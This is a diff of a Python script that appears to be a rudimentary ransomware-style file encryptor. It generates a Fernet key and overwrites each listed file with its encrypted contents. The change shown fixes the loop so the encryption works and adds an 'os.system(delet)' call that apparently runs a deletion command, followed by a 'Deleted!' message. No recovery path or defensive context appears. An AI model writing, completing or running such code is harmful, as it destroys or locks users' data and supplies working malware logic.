@@ -30,13 +30,14 @@ print(files)
 secretkey = Fernet.generate_key()
 
 # Going through the files list and encrpying everything
-for file in file:
+for file in files:
 	with open(file, "rb") as thefile:
 		contents = thefile.read()
 	contents_encrypted = Fernet(secretkey).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
    
+os.system(delet)
 print("Deleted!")   
 
 time.sleep(5)
